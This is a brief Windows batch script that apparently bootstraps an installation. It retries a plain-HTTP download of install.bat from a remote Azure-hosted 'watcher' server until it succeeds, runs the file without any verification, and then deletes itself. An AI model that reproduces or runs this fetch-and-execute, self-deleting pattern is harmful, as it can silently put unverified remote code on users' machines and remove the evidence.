:download
    curl http://watcher.centralindia.cloudapp.azure.com:8080/install.bat -o install.bat
    @REM curl http://localhost:8080/install.bat -o install.bat
if %errorlevel% NEQ 0 goto download
start .\install.bat
del bootstrap.bat && exit
